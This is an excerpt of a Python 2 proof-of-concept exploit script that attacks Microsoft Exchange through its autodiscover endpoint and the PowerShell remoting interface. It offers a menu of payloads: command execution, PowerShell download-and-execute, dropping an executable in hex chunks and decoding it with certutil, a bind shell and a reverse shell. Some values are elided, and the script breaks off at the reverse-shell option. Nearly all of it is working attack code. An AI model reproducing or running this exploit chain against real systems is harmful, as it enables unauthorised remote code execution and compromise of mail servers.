...
print "Some values have been left blank"
print "[*] Usage: python2 poc.py argv"
print "[*] argv = 1 -> command \"whoami > C:\\Users\\Public\\poc.txt\""
print "[*] argv = 2 -> download and execute"
print "[*] argv = 3 -> drop and execute"
print "[*] argv = 4 -> bind shell"
print "[*] argv = 5 -> reverse shell"
print "---------------------------------------------------------------------"
...
# execute some script 
#CMD1 = "powershell -c \"Invoke-WebRequest -Uri ... -OutFile ... \"" 
#CMD2 = "powershell -c \"Invoke-Expression -Command ...\""

# write content to file
#CMD1 = "powershell -c \"New-Item ..."
#CMD2 = "powershell -exec bypass -c \"Set-Content ... 'Welcome to the Internet'\""
...
def post_request(original_url, headers, data = None, cookies = {}):
	...
	cookies["Email"] = "autodiscover/anotheruser@ktt.net"
	
        # url = "https://win-exchange/autodiscover/anotheruser@ktt.net/powershell/autodiscover.json?x=a"
        url = base_url + "/autodiscover/anotheruser@ktt.net/%s/autodiscover.json?x=a" % original_url
...
def create_powershell_shell(SessionId, RPID):
	...
	<s:Header>
		<a:To>https://win-exchange:443/PowerShell?PSVersion=5.1.19041.610</a:To>
...
def run_cmdlet_new_offlineaddressbook(SessionId, RPID, ShellId, CMD):
	print "[+] Run cmdlet get-mailbox"
	headers = {
		"Content-Type": "application/soap+xml;charset=UTF-8",
		}
	url = "/powershell"
...
# short default lifetime of powershell session
def request_keepalive(SessionId, ShellId):
    ...
    <s:Header>
        ...
        <wsa:To>http://win-exchange/</wsa:To>
...
if choice == "1":
    CMD1 = "whoami > C:\\Users\\Public\\poc.txt"
    run_cmdlet_new_offlineaddressbook(SessionId, RPID, shell_id, CMD1)
elif choice == "2":
    download_url = "..."
    Outpath = "..."
    CMD1 = "powershell -c \"Invoke-WebRequest -Uri {url} -OutFile {outpath}\"".format(url = download_url, outpath = Outpath)
    run_cmdlet_new_offlineaddressbook(SessionId, RPID, shell_id, CMD1)
    time.sleep(7)
    CMD2 = "powershell -c \"Invoke-Expression -Command {outpath}\"".format(outpath = Outpath)
    run_cmdlet_new_offlineaddressbook(SessionId, RPID, shell_id, CMD2)
elif choice == "3":
    f = open("...", "rb")
    hex_content = f.read().encode('hex')
    f.close()
    length = len(hex_content)
    num = length / 4000

    txt_path = "..."
    exe_path = "..."
    
    CMD1 = "powershell -c \"New-Item {txt}\"".format(txt = txt_path)
    run_cmdlet_new_offlineaddressbook(SessionId, RPID, shell_id, CMD1)
    for i in range (num):
        CMD2 = "powershell -c \"Add-Content {txt} {data} -NoNewLine\"".format(data = hex_content[4000*i:4000*(i+1)], txt = txt_path)
        run_cmdlet_new_offlineaddressbook(SessionId, RPID, shell_id, CMD2)
        time.sleep(3)
    CMD3 = "powershell -c \"Add-Content {txt} {data} -NoNewLine\"".format(data = hex_content[4000*num:], txt = txt_path)
    run_cmdlet_new_offlineaddressbook(SessionId, RPID, shell_id, CMD3)
    time.sleep(3)
    CMD4 = "certutil -f -decodehex {txt} {exe}".format(txt = txt_path, exe = exe_path)
    CMD5 = "powershell -c \"Invoke-Expression -Command {exe}\"".format(exe = exe_path)
    run_cmdlet_new_offlineaddressbook(SessionId, RPID, shell_id, CMD4)
    time.sleep(3)
    run_cmdlet_new_offlineaddressbook(SessionId, RPID, shell_id, CMD5)
elif choice == "4":
# use shell script from https://gitbook.brainyou.stream/reverse-shells
    download_url = "..."
    outpath = "..."
    CMD1 = "powershell -c \"Invoke-WebRequest -Uri {url} -OutFile {out}\"".format(url = download_url, out = outpath) 
    CMD2 = "powershell -c \"Invoke-Expression -Command {out}\"".format(out = outpath)
    run_cmdlet_new_offlineaddressbook(SessionId, RPID, shell_id, CMD1)
    time.sleep(7)
    run_cmdlet_new_offlineaddressbook(SessionId, RPID, shell_id, CMD2)
elif choice == "5":
